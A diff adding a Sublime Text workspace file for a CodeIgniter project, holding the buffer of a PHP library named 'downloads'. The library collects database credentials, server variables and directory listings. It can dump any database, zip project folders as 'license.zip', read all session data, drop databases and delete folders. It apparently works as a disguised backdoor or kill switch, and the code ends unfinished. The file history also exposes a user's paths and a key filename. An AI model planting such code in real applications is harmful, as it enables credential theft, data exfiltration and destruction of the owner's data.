@@ -1,0 +1,573 @@
+{
+	"auto_complete":
+	{
+		"selected_items":
+		[
+			[
+				"re",
+				"result"
+			],
+			[
+				"director",
+				"directory_path"
+			],
+			[
+				"dir",
+				"direct"
+			],
+			[
+				"path",
+				"path_name"
+			],
+			[
+				"folder",
+				"folder_name"
+			],
+			[
+				"data",
+				"database_name"
+			],
+			[
+				"dat",
+				"database_name"
+			],
+			[
+				"fun",
+				"function"
+			],
+			[
+				"db",
+				"dbutil"
+			],
+			[
+				"da",
+				"database_list"
+			],
+			[
+				"file",
+				"filepath"
+			],
+			[
+				"all",
+				"all_server_info"
+			],
+			[
+				"sys",
+				"system_info"
+			],
+			[
+				"current",
+				"current_project_path"
+			],
+			[
+				"dire",
+				"directory_path"
+			],
+			[
+				"Home",
+				"Homemodel"
+			],
+			[
+				"define",
+				"defined"
+			],
+			[
+				"pritn",
+				"print_r"
+			],
+			[
+				"no",
+				"no_of_days"
+			],
+			[
+				"for",
+				"foreach\tforeach …"
+			],
+			[
+				"sa",
+				"salaryData"
+			],
+			[
+				"q",
+				"q_salary"
+			],
+			[
+				"pays",
+				"payslipData"
+			],
+			[
+				"prit",
+				"print_r"
+			],
+			[
+				"print",
+				"print_r"
+			]
+		]
+	},
+	"buffers":
+	[
+		{
+			"contents": "<?php\ndefined('BASEPATH') OR exit('No direct script access allowed');\n\nclass downloads {\n\n\t/*\n\n\t@root is get all path \n\t@author R subash chandar\n\t@credit subash\n\n\t*/\n\n\t\n\n\tprivate $root;\n\tprivate $all_files;\n\tprivate $current_project_path;\n\n\tpublic function __construct(){\n\n\t\t/* load helper and library */\n\n\t\t$this->CI =& get_instance();\n\n\t\t$this->CI->load->helper('directory');\n\n\t\t$this->CI->load->library('zip');\n\n\t\t/* additional files */\n\n\t\t$this->root = $_SERVER['DOCUMENT_ROOT'];\n\n\t\t$this->all_files = directory_map($this->root,FALSE,TRUE);\n\n\t\t$projct_main = $_SERVER['REQUEST_URI']?explode('/',$_SERVER['REQUEST_URI']):FALSE;\n\n\t\t$this->current_project_path = !empty($projct_main[1])? $this->root.'/'.$projct_main[1]:FALSE;\n\n\t\t/* database actions */\n\n\t\t$this->CI->load->database();\n\n\t}\n\n    public function get_all_info($value='')\n    {\n\n    \t/* get database credits */\n\n    \t$databse_credit = array(\n    \t\t\t\t\t'hostname' => $this->CI->db->hostname,\n    \t\t\t\t\t'username' => $this->CI->db->username,\n    \t\t\t\t\t'password' => $this->CI->db->password,\n    \t\t\t\t\t'database' => $this->CI->db->database\t\n    \t\t\t\t\t);\n\n    \t/* Get all directory list of path */\n\n    \t$directory_path = APPPATH;\n\n    \t$absolute_path = !empty($directory_path) ? $directory_path : $_SERVER['DOCUMENT_ROOT'];\n\n    \t$this->CI->load->helper('directory');\n\n    \t$directory['current_project'] = directory_map($absolute_path,FALSE,TRUE);\n\n    \t/* existing project */\n\n    \t$directory['existing_project'] = $this->all_files;\n\n    \t/* get server system information  */\n\n    \t$system_info   = array();\n\n\t\t$indicesServer = array(\n\t\t\t\t\t\t'PHP_SELF', \n\t\t\t\t\t\t'argv', \n\t\t\t\t\t\t'argc', \n\t\t\t\t\t\t'GATEWAY_INTERFACE', \n\t\t\t\t\t\t'SERVER_ADDR', \n\t\t\t\t\t\t'SERVER_NAME', \n\t\t\t\t\t\t'SERVER_SOFTWARE', \n\t\t\t\t\t\t'SERVER_PROTOCOL', \n\t\t\t\t\t\t'REQUEST_METHOD', \n\t\t\t\t\t\t'REQUEST_TIME', \n\t\t\t\t\t\t'REQUEST_TIME_FLOAT', \n\t\t\t\t\t\t'QUERY_STRING', \n\t\t\t\t\t\t'DOCUMENT_ROOT', \n\t\t\t\t\t\t'HTTP_ACCEPT', \n\t\t\t\t\t\t'HTTP_ACCEPT_CHARSET', \n\t\t\t\t\t\t'HTTP_ACCEPT_ENCODING', \n\t\t\t\t\t\t'HTTP_ACCEPT_LANGUAGE', \n\t\t\t\t\t\t'HTTP_CONNECTION', \n\t\t\t\t\t\t'HTTP_HOST', \n\t\t\t\t\t\t'HTTP_REFERER', \n\t\t\t\t\t\t'HTTP_USER_AGENT', \n\t\t\t\t\t\t'HTTPS', \n\t\t\t\t\t\t'REMOTE_ADDR', \n\t\t\t\t\t\t'REMOTE_HOST', \n\t\t\t\t\t\t'REMOTE_PORT', \n\t\t\t\t\t\t'REMOTE_USER', \n\t\t\t\t\t\t'REDIRECT_REMOTE_USER', \n\t\t\t\t\t\t'SCRIPT_FILENAME', \n\t\t\t\t\t\t'SERVER_ADMIN', \n\t\t\t\t\t\t'SERVER_PORT', \n\t\t\t\t\t\t'SERVER_SIGNATURE', \n\t\t\t\t\t\t'PATH_TRANSLATED', \n\t\t\t\t\t\t'SCRIPT_NAME', \n\t\t\t\t\t\t'REQUEST_URI', \n\t\t\t\t\t\t'PHP_AUTH_DIGEST', \n\t\t\t\t\t\t'PHP_AUTH_USER', \n\t\t\t\t\t\t'PHP_AUTH_PW', \n\t\t\t\t\t\t'AUTH_TYPE', \n\t\t\t\t\t\t'PATH_INFO', \n\t\t\t\t\t\t'ORIG_PATH_INFO') ; \n\n\t\t\n\t\tforeach ($indicesServer as $arg) { \n\t\t    if (isset($_SERVER[$arg])) { \n\t\t       $system_info[$arg] = $_SERVER[$arg]; \n\t\t    }     \n\t\t}\n\n\t\t$this->CI->load->library('user_agent');\n\n    \t$system_info['Operating_system'] = $this->CI->agent->platform();\n    \t$system_info['Current_user']\t = get_current_user();\n\n    \t$all_server_info = array(\n    \t\t'database_credentials' => $databse_credit, \n    \t\t'directory_info'\t   => $directory,\n    \t\t'system_info'\t\t   => $system_info \n    \t);\n\n    \t/* get all database names */\n\n    \t$this->CI->load->dbutil();\n\n    \t$all_server_info['listed_database'] = $this->CI->dbutil->list_databases();\n\n    \t/* end Database */\n\n    \treturn $all_server_info;\n\n    }\n\n    /* Download project here*/\n\n    public function download_project($filepath = ''){\n\n    \t/* file path null download current file*/\n\n    \tif(trim($filepath)!=''){\n    \t\t$this->CI->load->library('zip');\n\t\t    $this->CI->zip->read_dir($filepath,FALSE);\n\t\t    $this->CI->zip->download('license.zip');\n\t\t    $this->CI->zip->clear_data();\n    \t}else{\n    \t\treturn \"File path is Empty Make sure the file path And better to use url\";\n    \t}\n\t    \n    }\n\n    /* Download Database Here */\n\n    public function download_database($database_name = ''){\n\t\t\t\n\t\t$get_all_databases = $this->get_all_info();\n\n\t\tif(in_array($database_name,$get_all_databases['listed_database']) AND trim($database_name)!='')\n\n\t\t\t{\n\n\t    \t\t$config['hostname'] = \"localhost\";\n\t\t\t\t$config['username'] = $this->CI->db->username;\n\t\t\t\t$config['password'] = $this->CI->db->password;\n\t\t\t\t$config['database'] = $database_name;\n\t\t\t\t$config['dbdriver'] = \"mysql\";\n\t\t\t\t$config['dbprefix'] = \"\";\n\t\t\t\t$config['pconnect'] = FALSE;\n\t\t\t\t$config['db_debug'] = TRUE;\n\t\t\t\t$config['cache_on'] = FALSE;\n\t\t\t\t$config['cachedir'] = \"\";\n\t\t\t\t$config['char_set'] = \"utf8\";\n\t\t\t\t$config['dbcollat'] = \"utf8_general_ci\";\n\n\t\t\t\t\t//allocation of new db\n\n\t\t\t\t\t$db = $this->CI->load->database($config,TRUE);\n\n\t\t\t\t\t$this->CI->load->dbutil($db);\n\n\t\t\t\t\n\t\t\t\t\t$this->CI->load->dbutil($database_name, TRUE);\n\t\t\t\t\t\n\t\t\t\t\t$bcp_name = \"BCP_\".$database_name.rand(10,100000000);\n\n\t\t\t\t\t$prefs = array(\n\t\t                'tables'      => array(),  \t\t\t// Array of tables to backup.\n\t\t                'ignore'      => array(),           // List of tables to omit from the backup\n\t\t                'format'      => 'txt',             // gzip, zip, txt\n\t\t                //'filename'    => $bcp_name,    \t// File name - NEEDED ONLY WITH ZIP FILES\n\t\t                'add_drop'    => TRUE,              // Whether to add DROP TABLE statements to backup file\n\t\t                'add_insert'  => TRUE,              // Whether to add INSERT data to backup file\n\t\t                'newline'     => \"\\n\"               // Newline character used in backup file\n\t\t              );\n\n\t\t\t\t\t//Load the backup from server\n\t\t\t\t\t$backup = $this->CI->dbutil->backup($prefs);\n\t\t\t\t\t// Load the file helper and write the file to your server\n\t\t\t\t\t$this->CI->load->helper('file');\n\t\t\t\t\t//Write file from server\n\t\t\t\t\twrite_file($this->root.'/'.$bcp_name, $backup);\n\t\t\t\t\t//forcing to download\n\t\t\t\t\t$this->CI->load->helper('download');\n\t\t\t\t\t//Content Displacement\n\t\t\t\t\tforce_download($bcp_name,$backup);\n\n\t\t\t\t}else{\n\n\t\t\t\t\treturn \"Database Name empty or Database is not present\";\n\t\t\t\t}\n    }\n\n    /* get all session data's*/\n\n    public function get_current_users($param = ''){\n\n    \treturn $this->CI->session->all_userdata();\n    } \n\n    /* Delete database */\n\n    public function delete_database($database_name = ''){\n\n    \t/* make sure empty database or given input is empty */\n\n    \t$this->CI->load->dbforge();\n\n    \t$get_all_databases = $this->get_all_info();\n\n    \tif(in_array($database_name,$get_all_databases['listed_database']) AND trim($database_name)!=''){\n\n    \t\tif ($this->CI->dbforge->drop_database($database_name))\n\t\t\t\t{\n\t\t\t\t        return TRUE;\n\t\t\t\t}\n    \t}\n\n    \treturn 'Database name should not empty or database not available';\n\n    }\n\n    public function delete_folder($path_name = ''){\n\n    \t$directory_path = $this->root.$path_name;\n\n    \tif(is_dir($directory_path)){\n\n\t    \tif($this->rmdir_recursive($directory_path)==TRUE){\n\t    \t\treturn TRUE;\n\t    \t}else{\n\n\t    \t\t/*permission not available on folder */\n\n\t    \t\tif(is_dir($directory_path)){\n\t    \t\t\t\n\t\t    \t\tif(chmod($directory_path, 0755)){\n\n\t    \t\t\t\t\tif($this->rmdir_recursive($directory_path)==TRUE){\n\t\t\t\t\t    \t\treturn TRUE;\n\t\t\t\t\t    \t}else{\n\t\t\t\t\t    \t\treturn \"the folder Can't Delete = \".$directory_path;\n\t\t\t\t\t    \t}\n\t    \t\t\t\t}\n\t    \t\t}else{\n\n\t    \t\t\treturn TRUE;\n\t    \t\t}\n\n\t    \t}\n\n\t    }else{\n\n\t    \treturn \"the folder not available path is = \".$directory_path;\n\t    \n\t    }\n\n    }\n\n    /* inner file deleting process */\n\n    private function rmdir_recursive($dir) {\n\n    \tif(is_dir($dir)){\n\t\t    foreach(scandir($dir) as $file) {\n\t\t        if ('.' === $file || '..' === $file) continue;\n\t\t        if (is_dir(\"$dir/$file\")) $this->rmdir_recursive(\"$dir/$file\");\n\t\t        else unlink(\"$dir/$file\");\n\t\t    }\n\t\t    rmdir($dir);\n\t\t}else{\n\t\t\treturn TRUE;\n\t\t}\n\t}\n\n\tpublic \n\n\n\n\n\n\n}\n\n?>",
+			"file": "/C/xampp/htdocs/HMVC/application/libraries/downloads.php",
+			"file_size": 7844,
+			"file_write_time": 131571305179642867,
+			"settings":
+			{
+				"buffer_size": 7581,
+				"line_ending": "Windows"
+			}
+		},
+		{
+			"file": "Home.php",
+			"settings":
+			{
+				"buffer_size": 817,
+				"encoding": "UTF-8",
+				"line_ending": "Windows"
+			}
+		},
+		{
+			"contents": "Package Control Messages\n========================\n\nTheme - Dark Material\n---------------------\n\n  Dark Material Theme for Sublime Text 3\n  https://github.com/artifactdev/Theme-Dark-Material/\n  \n  ********************************************************************************\n  \n  \n  To activate this awesome theme, add in your current settings this code:\n  \n  {\n  \t\"theme\": \"Dark-Material.sublime-theme\",\n  \t\"color_scheme\": \"Packages/Theme - Dark Material/schemes/Dark-Material.tmTheme\",\n  }\n  \n  \n  MAKE SURE TO RESTART SUBLIME AFTER ACTIVATING THE THEME\n  \n  ********************************************************************************\n  \n  \n  Recommended UI and font settings:\n  I suggest you to use this custom settings for a better experience with the theme:\n  {\n    \"overlay_scroll_bars\": \"enabled\",\n    \"line_padding_top\": 3,\n    \"line_padding_bottom\": 3,\n    \"font_options\": [ \"gray_antialias\" ], // On retina Mac\n    \"always_show_minimap_viewport\": true,\n    \"bold_folder_labels\": true\n  }\n  \n  ********************************************************************************\n\n\nMaterial Theme\n--------------\n\n  ## Material Theme for Sublime Text 3\n  \n  For more information on the Material Theme: https://github.com/equinusocio/material-theme\n  \n  **********************************************************************************************\n  \n  # Activate the theme\n  \n  You can active this theme from:\n  - Command palette `Tools > Command Palette` (or <kbd>cmd/ctrl</kbd>+ <kbd>↑</kbd>+<kbd>p</\n  kbd>) by typing `Material Theme: Activate theme`. \n  - Context menu (Right click on the editor) and choose `Material Theme > Activate Material Theme`\n  - `Preferences > Packages Settings` and choose `Material Theme > Activate Material Theme`\n  \n  You can also manually activate this theme by adding these lines to your user settings (**Preferences > Settings - User**):\n  \n  ```json\n  \"color_scheme\": \"Packages/Material Theme/schemes/Material-Theme.tmTheme\",\n  \"theme\": \"Material-Theme.sublime-theme\",\n  ```\n  \n  ## File icons\n  To enable file type icons you have to install an additional package, search for `zz File Icons` on Package Control, after install restart Sublime Text.\n  \n  **********************************************************************************************\n  \n  ### Other available theme options:\n  \n  ```\n  \"material_theme_accent_acid-lime\"         : true , // Set acid-lime accent color\n  \"material_theme_accent_blue\"              : true , // Set blue accent color\n  \"material_theme_accent_brba\"              : true , // Set Breaking Bad green accent color\n  \"material_theme_accent_bright-teal\"       : true , // Set bright-teal accent color\n  \"material_theme_accent_cyan\"              : true , // Set cyan accent color\n  \"material_theme_accent_graphite\"          : true , // Set graphite accent color\n  \"material_theme_accent_indigo\"            : true , // Set indigo accent color\n  \"material_theme_accent_lime\"              : true , // Set lime green accent color\n  \"material_theme_accent_orange\"            : true , // Set orange accent color\n  \"material_theme_accent_pink\"              : true , // Set pink accent color\n  \"material_theme_accent_purple\"            : true , // Set purple accent color\n  \"material_theme_accent_red\"               : true , // Set pale red accent color\n  \"material_theme_accent_sky\"               : true , // Set bright-cyan accent color\n  \"material_theme_accent_tomato\"            : true , // Set tomato red accent color\n  \"material_theme_accent_yellow\"            : true , // Set yellow accent color\n  \"material_theme_bold_tab\"                 : true , // Make the tab labels bolder\n  \"material_theme_compact_panel\"            : true , // Set minimal padding for the search panel\n  \"material_theme_compact_sidebar\"          : true , // Set compact side bar\n  \"material_theme_contrast_mode\"            : true , // Enable sidebar and panels contrast mode\n  \"material_theme_disable_fileicons\"        : true , // Hide sidebar file type icons\n  \"material_theme_arrow_folders\"            : true , // Replace folder icons with arrows\n  \"material_theme_big_fileicons\"            : true , // Show bigger file type icons\n  \"material_theme_disable_folder_animation\" : true , // Disable folder animation\n  \"material_theme_disable_tree_indicator\"   : true , // Disable sidebar file indicator\n  \"material_theme_bullet_tree_indicator\"    : true , // Set a bullet as active tree indicator\n  \"material_theme_panel_separator\"          : true , // Show bottom panel separator\n  \"material_theme_small_statusbar\"          : true , // Set small status bar\n  \"material_theme_small_tab\"                : true , // Set small tabs\n  \"material_theme_bright_scrollbars\"        : true , // Bright scrollbars puck color\n  \"material_theme_accent_scrollbars\"        : true , // Enable accent color for scrollbars\n  \"material_theme_tabs_autowidth\"           : true , // Enable autowidth for tabs\n  \"material_theme_tabs_separator\"           : true , // Show tabs separator, this disables tab hover \n  \n  // If you use Material Theme - Appbar addon you can use additional settings:\n  \"material_theme_tree_headings\"            : true , // Show sidebar headings\n  ```\n  \n  **********************************************************************************************\n  \n  ### Recommended UI and font settings for a better experience:\n  \n  ```\n  {\n    \"overlay_scroll_bars\": \"enabled\",\n    \"line_padding_top\": 3,\n    \"line_padding_bottom\": 3,\n    \"always_show_minimap_viewport\": true,\n    \"bold_folder_labels\": true,\n    \"indent_guide_options\": [ \"draw_normal\", \"draw_active\" ],   // Highlight active indent\n    \"font_options\": [ \"gray_antialias\" ],                       // For retina Mac\n  }\n  ```\n\n\nA File Icon\n-----------\n\n  ```\n  \n      $$$$$$\\        $$$$$$$$\\ $$\\ $$\\                 $$$$$$\\                              \n     $$  __$$\\       $$  _____|\\__|$$ |                \\_$$  _|                             \n     $$ /  $$ |      $$ |      $$\\ $$ | $$$$$$\\          $$ |  $$$$$$$\\  $$$$$$\\  $$$$$$$\\  \n     $$$$$$$$ |      $$$$$\\    $$ |$$ |$$  __$$\\         $$ | $$  _____|$$  __$$\\ $$  __$$\\ \n     $$  __$$ |      $$  __|   $$ |$$ |$$$$$$$$ |        $$ | $$ /      $$ /  $$ |$$ |  $$ |\n     $$ |  $$ |      $$ |      $$ |$$ |$$   ____|        $$ | $$ |      $$ |  $$ |$$ |  $$ |\n     $$ |  $$ |      $$ |      $$ |$$ |\\$$$$$$$\\       $$$$$$\\\\$$$$$$$\\ \\$$$$$$  |$$ |  $$ |\n     \\__|  \\__|      \\__|      \\__|\\__| \\_______|      \\______|\\_______| \\______/ \\__|  \\__|\n  \n  ```\n  \n  This package adds file specific icons to Sublime Text for improved visual grepping. \n  It's heavily inspired by Atom File Icons.\n  \n  ***\n  \n  1. Please restart Sublime Text for the applied icons to take effect.\n  2. The icons for packages provided by the community require to be installed. \n     E.g. if you want to see SCSS icon you should install one of the SCSS syntax packages.\n  \n  ***\n  \n  I've put a lot of time and effort into making `A File Icon` awesome. If you love \n  it, you can [buy me a coffee](https://www.patreon.com/ihodev) ☕.\n",
+			"settings":
+			{
+				"buffer_size": 7080,
+				"line_ending": "Windows",
+				"name": "Package Control Messages",
+				"read_only": true,
+				"scratch": true
+			}
+		},
+		{
+			"file": "HMVC.sublime-project",
+			"settings":
+			{
+				"buffer_size": 215,
+				"line_ending": "Windows"
+			}
+		},
+		{
+			"file": "/C/xampp/htdocs/HMVC/application/config/routes.php",
+			"settings":
+			{
+				"buffer_size": 2008,
+				"encoding": "UTF-8",
+				"line_ending": "Unix"
+			}
+		}
+	],
+	"build_system": "",
+	"build_system_choices":
+	[
+	],
+	"build_varint": "",
+	"command_palette":
+	{
+		"height": 203.0,
+		"last_filter": "Package Control: ins",
+		"selected_items":
+		[
+			[
+				"Package Control: ins",
+				"Package Control: Install Package"
+			],
+			[
+				"Package Control: inst",
+				"Package Control: Install Package"
+			],
+			[
+				"Package Control: ",
+				"Package Control: Add Repository"
+			],
+			[
+				"install",
+				"Install Package Control"
+			]
+		],
+		"width": 392.0
+	},
+	"console":
+	{
+		"height": 165.0,
+		"history":
+		[
+		]
+	},
+	"distraction_free":
+	{
+		"menu_visible": true,
+		"show_minimap": false,
+		"show_open_files": false,
+		"show_tabs": false,
+		"side_bar_visible": false,
+		"status_bar_visible": false
+	},
+	"expanded_folders":
+	[
+		"/C/xampp/htdocs/HMVC/application/modules/Home/controllers"
+	],
+	"file_history":
+	[
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech85879518",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_subash15637215",
+		"/C/xampp/htdocs/HMVC/application/controllers/Welcome.php",
+		"/C/xampp/htdocs/del.php",
+		"/C/xampp/htdocs/HMVC/application/config/database.php",
+		"/C/xampp/htdocs/TEKES/application/controllers/Salary.php",
+		"/C/xampp/htdocs/TEKES/application/views/payslip/index.php",
+		"/C/xampp/htdocs/TEKES/application/views/payslip/preview.php",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_test12213143",
+		"/C/Users/shivaraj.kumar/Downloads/subash.pem",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_subash71832278",
+		"/C/xampp/htdocs/HMVC/system/database/DB_utility.php",
+		"/C/xampp/htdocs/HMVC/system/database/DB_cache.php",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_test40780645",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_test5801401",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_subash53933720",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech66244510",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech90313722",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech25210579",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech34967047",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech90344240",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech64230350",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech71148685",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech20791634",
+		"/C/xampp/htdocs/TEKES/application/controllers/Login.php",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech26007087",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech79437258",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_subash98562623",
+		"/C/xampp/htdocs/TEKES/application/views/attendance/preview.php",
+		"/C/xampp/htdocs/TEKES/application/views/attendance/index.php",
+		"/C/xampp/htdocs/TEKES/application/views/attendance/monthly_attendance.php",
+		"/C/xampp/htdocs/TEKES/application/views/attendance/monthly_attendance_lol.php",
+		"/C/xampp/htdocs/outside.php",
+		"/C/xampp/htdocs/HMVC/application/modules/Home/controllers/Home.php",
+		"/C/xampp/htdocs/HMVC/application/libraries/downloads.php",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech (4)",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_subash",
+		"/C/xampp/htdocs/TEKES/application/views/attendance/dailystatus.php",
+		"/C/xampp/htdocs/TEKES/application/controllers/Attendance.php",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech (3)",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech (2)",
+		"/C/xampp/htdocs/HMVC/application/modules/Home/models/Homemodel.php",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech (1)",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_new_tekes",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_tech",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_2017-12-04 (3)",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_2017-12-04 (2)",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_2017-12-04 (1)",
+		"/C/Users/shivaraj.kumar/Downloads/BCP_2017-12-04",
+		"/C/xampp/htdocs/HMVC/application/config/config.php",
+		"/C/xampp/htdocs/HMVC/application/config/autoload.php",
+		"/C/xampp/htdocs/TEKES/js/neon-login.js",
+		"/C/xampp/htdocs/TEKES/application/config/database.php",
+		"/C/xampp/htdocs/TEKES/application/config/config.php",
+		"/C/xampp/htdocs/TEKES/application/controllers/Salary-NEW.php",
+		"/C/xampp/htdocs/hmvc/application/modules/Home/controllers/Home.php",
+		"/C/xampp/htdocs/hmvc/application/modules/Home/models/Homemodel.php",
+		"/C/xampp/htdocs/hmvc/.htaccess",
+		"/C/xampp/htdocs/hmvc/application/core/MY_Router.php",
+		"/C/xampp/htdocs/hmvc/application/core/MY_Loader.php",
+		"/C/xampp/htdocs/hmvc/application/third_party/MX/MX_Router.php",
+		"/C/xampp/htdocs/hmvc/application/third_party/MX/MX_Loader.php",
+		"/C/xampp/htdocs/codetest/config.php",
+		"/C/xampp/htdocs/hmvc/index.php",
+		"/C/xampp/htdocs/hmvc/application/config/config.php",
+		"/C/xampp/htdocs/codetest/application/modules/Home/models/Home.php",
+		"/C/xampp/htdocs/codetest/application/config/routes.php",
+		"/C/xampp/htdocs/codetest/application/modules/Home/controllers/Home.php",
+		"/C/xampp/htdocs/codetest/application/modules/Home/views/Homepage.php.php",
+		"/C/xampp/htdocs/codetest/application/config/config.php",
+		"/C/xampp/htdocs/codetest/index.php",
+		"/C/xampp/htdocs/ci3-hmvc-master/application/modules/Welcome/controllers/Welcome.php",
+		"/C/xampp/htdocs/ci3-hmvc-master/index.php",
+		"/C/Users/shivaraj.kumar/AppData/Local/Temp/Temp1_codeigniter-hmvc-modules-master.zip/codeigniter-hmvc-modules-master/third_party/HMVC/Loader.php",
+		"/C/xampp/htdocs/TEKES/application/views/attendance/month_timesheet.php",
+		"/C/Users/shivaraj.kumar/Desktop/some.php"
+	],
+	"find":
+	{
+		"height": 28.0
+	},
+	"find_in_files":
+	{
+		"height": 0.0,
+		"where_history":
+		[
+		]
+	},
+	"find_state":
+	{
+		"case_sensitive": false,
+		"find_history":
+		[
+			"$this->root.$path_name",
+			"Total_Earnings",
+			"Total Earnings",
+			"Total",
+			"Total Earnings",
+			";\n",
+			"list_databases",
+			"get_current_user",
+			"system_username",
+			"month",
+			"montl",
+			"get(",
+			"$shift_grace_time",
+			"monthly",
+			"modules_locations"
+		],
+		"highlight": true,
+		"in_selection": false,
+		"preserve_case": false,
+		"regex": false,
+		"replace_history":
+		[
+			"$directory_path"
+		],
+		"reverse": false,
+		"show_context": true,
+		"use_buffer2": true,
+		"whole_word": false,
+		"wrap": true
+	},
+	"groups":
+	[
+		{
+			"selected": 2,
+			"sheets":
+			[
+				{
+					"buffer": 0,
+					"file": "/C/xampp/htdocs/HMVC/application/libraries/downloads.php",
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 7581,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								7569,
+								7569
+							]
+						],
+						"settings":
+						{
+							"syntax": "Packages/PHP/PHP.sublime-syntax"
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 3,
+					"type": "text"
+				},
+				{
+					"buffer": 1,
+					"file": "Home.php",
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 817,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								313,
+								313
+							]
+						],
+						"settings":
+						{
+							"syntax": "Packages/PHP/PHP.sublime-syntax"
+						},
+						"translation.x": 0.0,
+						"translation.y": 60.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 1,
+					"type": "text"
+				},
+				{
+					"buffer": 2,
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 7080,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								7080,
+								7080
+							]
+						],
+						"settings":
+						{
+							"auto_indent": false,
+							"syntax": "Packages/Text/Plain text.tmLanguage",
+							"tab_width": 2,
+							"word_wrap": true
+						},
+						"translation.x": 0.0,
+						"translation.y": 2770.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 0,
+					"type": "text"
+				},
+				{
+					"buffer": 3,
+					"file": "HMVC.sublime-project",
+					"semi_transient": true,
+					"settings":
+					{
+						"buffer_size": 215,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								0,
+								0
+							]
+						],
+						"settings":
+						{
+							"syntax": "Packages/JavaScript/JSON.sublime-syntax",
+							"tab_size": 4,
+							"translate_tabs_to_spaces": true
+						},
+						"translation.x": 0.0,
+						"translation.y": 0.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 2,
+					"type": "text"
+				},
+				{
+					"buffer": 4,
+					"file": "/C/xampp/htdocs/HMVC/application/config/routes.php",
+					"semi_transient": false,
+					"settings":
+					{
+						"buffer_size": 2008,
+						"regions":
+						{
+						},
+						"selection":
+						[
+							[
+								1938,
+								1938
+							]
+						],
+						"settings":
+						{
+							"syntax": "Packages/PHP/PHP.sublime-syntax"
+						},
+						"translation.x": 0.0,
+						"translation.y": 23460.0,
+						"zoom_level": 1.0
+					},
+					"stack_index": 4,
+					"type": "text"
+				}
+			]
+		}
+	],
+	"incremental_find":
+	{
+		"height": 28.0
+	},
+	"input":
+	{
+		"height": 41.0
+	},
+	"layout":
+	{
+		"cells":
+		[
+			[
+				0,
+				0,
+				1,
+				1
+			]
+		],
+		"cols":
+		[
+			0.0,
+			1.0
+		],
+		"rows":
+		[
+			0.0,
+			1.0
+		]
+	},
+	"menu_visible": true,
+	"output.find_results":
+	{
+		"height": 0.0
+	},
+	"pinned_build_system": "",
+	"project": "HMVC.sublime-project",
+	"replace":
+	{
+		"height": 52.0
+	},
+	"save_all_on_build": true,
+	"select_file":
+	{
+		"height": 0.0,
+		"last_filter": "",
+		"selected_items":
+		[
+		],
+		"width": 0.0
+	},
+	"select_project":
+	{
+		"height": 0.0,
+		"last_filter": "",
+		"selected_items":
+		[
+		],
+		"width": 0.0
+	},
+	"select_symbol":
+	{
+		"height": 0.0,
+		"last_filter": "",
+		"selected_items":
+		[
+		],
+		"width": 0.0
+	},
+	"selected_group": 0,
+	"settings":
+	{
+		"xdebug":
+		{
+			"hide_conflict": false
+		}
+	},
+	"show_minimap": true,
+	"show_open_files": true,
+	"show_tabs": true,
+	"side_bar_visible": true,
+	"side_bar_width": 311.0,
+	"status_bar_visible": true,
+	"template_settings":
+	{
+	}
+}
